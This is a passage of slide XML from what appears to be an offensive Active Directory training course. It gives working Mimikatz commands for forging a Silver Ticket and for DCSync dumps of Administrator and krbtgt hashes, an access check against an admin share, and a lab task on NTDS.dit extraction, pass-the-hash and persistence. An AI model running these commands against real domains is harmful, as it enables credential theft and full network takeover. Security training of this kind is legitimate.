              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>krbtgt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> hash ❌</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>✔ CORRECT:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FILESERVER$ hash ✔</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DC01$ hash ✔</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3461190120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74170"/>
            <a:ext cx="4070555" cy="6683829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1700" dirty="0"/>
              <a:t>Why this matters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700" dirty="0"/>
              <a:t>Golden Ticket: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700" dirty="0"/>
              <a:t>Uses KRBTGT → domain-wide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700" dirty="0"/>
              <a:t>Silver Ticket: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700" dirty="0"/>
              <a:t>Uses service account → single target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700" dirty="0"/>
              <a:t>🔥 Quick way to think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700" dirty="0"/>
              <a:t>Golden → master key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700" dirty="0"/>
              <a:t>Silver → specific door key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700" dirty="0"/>
              <a:t>What you should have after Step 2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700" dirty="0"/>
              <a:t>Target  = FILESERVER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700" dirty="0"/>
              <a:t>Service = CIFS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700" dirty="0"/>
              <a:t>Hash    = FILESERVER$ NTLM hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="17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58D6D43-D94D-CAF0-0C48-0D41BC295846}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4859593" y="0"/>
            <a:ext cx="6120580" cy="46228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dirty="0"/>
              <a:t>⚠️ Common mistakes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dirty="0"/>
              <a:t>❌ Using wrong hash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dirty="0"/>
              <a:t>👉 If you use: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dirty="0"/>
              <a:t>KRBTGT → won’t work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dirty="0"/>
              <a:t>User hash → won’t work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dirty="0"/>
              <a:t>❌ Using wrong machine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dirty="0"/>
              <a:t>👉 Hash must match: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dirty="0"/>
              <a:t>TARGET machine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dirty="0"/>
              <a:t>Final understanding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dirty="0"/>
              <a:t>You are pretending to be the service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dirty="0"/>
              <a:t>So you must use its key</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="179505177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5589639" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>STEP 3 — Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Purpose of this step</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 You are preparing your environment to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Forge + inject the Silver Ticket</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>📍 WHERE to do this</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 On the compromised Windows machine (victim shell)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Same place where you:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Ran </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Did </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Will run Silver Ticket</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>HOW to do it (practically)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>If you already transferred </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Just run:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>mimikatz.exe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AC32080-FF1A-D67A-DDC7-FFEE7C023DED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6071420" y="0"/>
            <a:ext cx="6120580" cy="62822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dirty="0"/>
              <a:t>What you should see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dirty="0"/>
              <a:t>When it opens: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dirty="0" err="1"/>
              <a:t>mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> #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dirty="0"/>
              <a:t>👉 That means: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dirty="0"/>
              <a:t>✔ Tool is running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dirty="0"/>
              <a:t>✔ You’re ready for next step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dirty="0"/>
              <a:t>⚠️ IMPORTANT (most people miss this)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dirty="0"/>
              <a:t>Before doing anything advanced, run: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dirty="0"/>
              <a:t>privilege::debug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dirty="0"/>
              <a:t>👉 Why?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dirty="0"/>
              <a:t>Gives </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> required privileges to manipulate tickets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dirty="0"/>
              <a:t>What you have now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dirty="0"/>
              <a:t>After Step 3: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dirty="0"/>
              <a:t>You + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> + service hash + target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dirty="0"/>
              <a:t>👉 Everything ready for:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2147727661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5206181" cy="6858000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1700" dirty="0"/>
              <a:t>STEP 4 — Create Silver Ticket (SHORT VERSION)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700" dirty="0"/>
              <a:t>👉 You only need to understand 3 things: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700" dirty="0"/>
              <a:t>1. Target machine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700" dirty="0"/>
              <a:t>2. Service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700" dirty="0"/>
              <a:t>3. That machine’s hash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700" dirty="0"/>
              <a:t>Minimal structure (don’t overthink)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700" dirty="0"/>
              <a:t>In </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0" err="1"/>
              <a:t>kerberos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>::golden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700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>domain:corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>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700" dirty="0"/>
              <a:t>/sid:S-1-5-21-...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700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>target:FILESERVER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>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700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>service:cifs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>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700" dirty="0"/>
              <a:t>/rc4:FILESERVER_HASH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700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>user:Administrator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>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700" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>ptt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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B309ECA-1AB0-3862-D252-9FE9FDDDD285}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5206181" y="0"/>
            <a:ext cx="6120580" cy="2960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1800" dirty="0"/>
              <a:t>That’s it. Nothing more.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800" dirty="0"/>
              <a:t>Even simpler explanation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800" dirty="0"/>
              <a:t>You are telling Windows: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800" dirty="0"/>
              <a:t>"I am Administrator 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800" dirty="0"/>
              <a:t>Give me access to FILESERVER (file sharing)"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800" dirty="0"/>
              <a:t>What happens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800" dirty="0"/>
              <a:t>Ticket created → injected → ready to use</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3733933202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6096000" cy="6858000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2400" dirty="0"/>
              <a:t>Test immediately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400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> \\FILESERVER\c$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400" dirty="0"/>
              <a:t> If it works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400" dirty="0"/>
              <a:t>✔ You’re admin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400" dirty="0"/>
              <a:t>✔ No password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400" dirty="0"/>
              <a:t>✔ No Domain Controller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400" dirty="0"/>
              <a:t> One-line understanding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400" dirty="0"/>
              <a:t>Silver Ticket = Use server’s own hash to fake access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E423DD2-5E03-D82E-1C13-A4974F97E9CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6781801" y="-128930"/>
            <a:ext cx="6150076" cy="71158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1800" dirty="0"/>
              <a:t>STEP 5 — Verify Access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800" dirty="0"/>
              <a:t>📍 WHERE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800" dirty="0"/>
              <a:t>👉 Same Windows shell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800" dirty="0"/>
              <a:t>(Where you ran </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>)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800" dirty="0"/>
              <a:t> WHAT YOU DO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800" dirty="0"/>
              <a:t>Just run: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800" dirty="0" err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> \\FILESERVER\c$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800" dirty="0"/>
              <a:t>What this command means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800" dirty="0"/>
              <a:t>\\FILESERVER\c$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800" dirty="0"/>
              <a:t>👉 Access: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800" dirty="0"/>
              <a:t>FILESERVER machine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800" dirty="0"/>
              <a:t>C drive (admin share)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800" dirty="0"/>
              <a:t>💥 SUCCESS = Silver Ticket worked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800" dirty="0"/>
              <a:t>If you see files like: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800" dirty="0"/>
              <a:t>Windows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800" dirty="0"/>
              <a:t>Program Files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800" dirty="0"/>
              <a:t>Users</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="842098511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10836"/>
            <a:ext cx="4911213" cy="6858000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1700" dirty="0"/>
              <a:t>👉 Then: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700" dirty="0"/>
              <a:t>✔ You are Administrator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700" dirty="0"/>
              <a:t>✔ Ticket worked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700" dirty="0"/>
              <a:t>✔ No password used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700" dirty="0"/>
              <a:t>✔ No Domain Controller involved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700" dirty="0"/>
              <a:t>❌ IF IT FAILS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700" dirty="0"/>
              <a:t>🔴 Access Denied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700" dirty="0"/>
              <a:t>👉 Means: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700" dirty="0"/>
              <a:t>Wrong hash OR wrong target OR wrong service</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="17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406FC08-0886-97C3-0126-6D41ED7271E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5279615" y="0"/>
            <a:ext cx="6120580" cy="42073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1800" dirty="0"/>
              <a:t>🔴 Network path not found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800" dirty="0"/>
              <a:t>👉 Means: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800" dirty="0"/>
              <a:t>Wrong hostname (use FILESERVER, not IP)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800" dirty="0"/>
              <a:t>🔴 Prompt for password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800" dirty="0"/>
              <a:t>👉 Means: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800" dirty="0"/>
              <a:t>Ticket not injected (/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ptt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> issue)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800" dirty="0"/>
              <a:t>ONE-LINE LOGIC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800" dirty="0"/>
              <a:t>If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> \\TARGET\c$ works → Silver Ticket SUCCESS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800" dirty="0"/>
              <a:t>That’s it — Step 5 is just a TEST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800" dirty="0"/>
              <a:t>No tricks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800" dirty="0"/>
              <a:t>No complexity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9973743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0500" y="0"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 04: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>NTDS.dit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Extraction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0500" y="1028700"/>
            <a:ext cx="11868150" cy="58293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dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: Mimic a Domain Controller to pull all user hashes from the database. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1828800" lvl="4" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Impacket’s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> secretsdump.py or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to perform a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> attack. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1828800" lvl="4" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Dump the entire </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>NTDS.dit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> database to get the NTLM hashes of every single user in the organization. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1828800" lvl="4" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Perform Pass-the-Hash (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>PtH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) using a dumped Administrator hash to verify access. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="2" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: Learn the final step of a total network takeover. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Weekly Deliverable: The Domain Dominance Report </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Requirement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: Submit a professional PDF report containing: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1828800" lvl="4" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attack Chain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: A step-by-step flow from how you got the first hash (Responder) to how you became Domain Admin (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1828800" lvl="4" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Artifact Analysis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Show the forged Golden Ticket and explain how it works. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1828800" lvl="4" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Persistence Strategy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: How would you maintain access if the Admin changes their password? </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1828800" lvl="4" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Security Hardening</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Provide 3 critical steps to defend against AD attacks (e.g., "Implementing Tiered Administration," "Disabling LLMNR," and "Rotating KRBTGT passwords twice"). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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3368904750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-1"/>
            <a:ext cx="3583858" cy="7182465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1700" dirty="0"/>
              <a:t>Method 1 — Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>📍 WHERE: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700" dirty="0"/>
              <a:t>👉 Windows compromised machine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700" dirty="0"/>
              <a:t>Steps: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700" dirty="0"/>
              <a:t>Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: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700" dirty="0"/>
              <a:t>mimikatz.exe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700" dirty="0"/>
              <a:t>Enable privileges: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700" dirty="0"/>
              <a:t>privilege::debug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700" dirty="0"/>
              <a:t>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C23BD57-DD9D-CADA-0DA1-70B3CA78BC0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3652683" y="-123825"/>
            <a:ext cx="6120580" cy="3791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1800" dirty="0"/>
              <a:t>Perform </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>: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800" dirty="0" err="1"/>
              <a:t>lsadump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dcsync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>domain:corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>user:Administrator</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0"/>
              <a:t>Expected output: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800" dirty="0"/>
              <a:t>Administrator:500:NTLM_HASH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800" dirty="0"/>
              <a:t>👉 You can also dump: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800" dirty="0" err="1"/>
              <a:t>lsadump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dcsync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>domain:corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>user:krbtgt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉 This proves:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
            </a:endParaRP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800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>You can extract ANY account hash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8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66329009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33350"/>
            <a:ext cx="5869858" cy="6724650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1800" dirty="0"/>
              <a:t>Method 2 — Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Impacket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (Cleaner)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800" dirty="0"/>
              <a:t> WHERE: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800" dirty="0"/>
              <a:t>👉 Kali attacker machine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800" dirty="0"/>
              <a:t> Command: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800" dirty="0"/>
              <a:t>secretsdump.py </a:t>
            </a:r>
            <a:r>
